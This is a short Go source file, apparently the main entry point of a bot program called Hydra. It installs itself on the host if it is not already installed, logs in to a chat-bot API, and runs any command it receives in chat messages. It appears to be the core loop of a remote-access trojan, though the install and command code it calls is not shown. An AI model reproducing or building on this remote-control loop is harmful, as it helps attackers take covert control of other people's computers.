package main

import (
	"log"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/commands"
	"github.com/Raffy27/Hydra/install"
)

func main() {
	if !install.IsInstalled() {
		install.Install()
		log.Println("Install successful")
	} else {
		log.Println("Already installed")
	}
	log.Println("Logged in as", api.Bot.Self.UserName)
	//api.NewGenesis()
	log.Println("Genesis is", api.Genesis)
	//go api.Heartbeat()
	for u := range api.Updates {
		if u.Message == nil {
			continue
		}
		log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		if u.Message.IsCommand() {
			commands.Perform(u.Message)
		}
	}
}
